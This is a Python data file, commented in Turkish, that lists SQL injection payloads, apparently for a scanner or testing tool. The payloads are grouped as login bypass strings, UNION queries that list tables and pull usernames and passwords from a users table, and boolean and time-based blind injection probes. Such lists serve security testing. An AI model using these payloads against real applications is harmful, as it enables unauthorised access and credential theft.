# -*- coding: utf-8 -*-
"""SQL Injection Payload Tanımları"""

SQLI_PAYLOADS = [
    # Kimlik doğrulama bypass
    {
        "payload": "' OR '1'='1",
        "description": "Klasik OR bypass",
        "category": "Auth Bypass"
    },
    {
        "payload": "' OR '1'='1' --",
        "description": "OR bypass (yorum satırı ile)",
        "category": "Auth Bypass"
    },
    {
        "payload": "' OR '1'='1' #",
        "description": "OR bypass (hash yorum ile)",
        "category": "Auth Bypass"
    },
    {
        "payload": "admin' --",
        "description": "Admin kullanıcı yorum bypass",
        "category": "Auth Bypass"
    },
    {
        "payload": "admin' #",
        "description": "Admin kullanıcı hash bypass",
        "category": "Auth Bypass"
    },
    {
        "payload": "' OR 1=1 --",
        "description": "Tırnak olmadan OR bypass",
        "category": "Auth Bypass"
    },
    {
        "payload": "1' OR '1'='1",
        "description": "Sayısal alan OR bypass",
        "category": "Auth Bypass"
    },
    # Veri çıkarma (Data Extraction)
    {
        "payload": "1 OR 1=1",
        "description": "Tüm kayıtları döndür",
        "category": "Data Extraction"
    },
    {
        "payload": "1' UNION SELECT null,null --",
        "description": "UNION tabanlı sütun sayısı tespiti",
        "category": "Data Extraction"
    },
    {
        "payload": "1' UNION SELECT user(),database() --",
        "description": "Kullanıcı ve veritabanı adı çıkarma",
        "category": "Data Extraction"
    },
    {
        "payload": "1' UNION SELECT table_name,null FROM information_schema.tables --",
        "description": "Tablo isimlerini listeleme",
        "category": "Data Extraction"
    },
    {
        "payload": "1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users' --",
        "description": "Users tablosu sütun isimleri",
        "category": "Data Extraction"
    },
    {
        "payload": "1' UNION SELECT user,password FROM users --",
        "description": "Kullanıcı adı ve şifre çıkarma",
        "category": "Data Extraction"
    },
    # Blind SQL Injection
    {
        "payload": "1' AND 1=1 --",
        "description": "Boolean tabanlı blind SQLi (True)",
        "category": "Blind SQLi"
    },
    {
        "payload": "1' AND 1=2 --",
        "description": "Boolean tabanlı blind SQLi (False)",
        "category": "Blind SQLi"
    },
    {
        "payload": "1' AND SLEEP(3) --",
        "description": "Zaman tabanlı blind SQLi (3 saniye)",
        "category": "Blind SQLi"
    },
    {
        "payload": "1' AND (SELECT COUNT(*) FROM users) > 0 --",
        "description": "Users tablosu varlık kontrolü",
        "category": "Blind SQLi"
    },
]
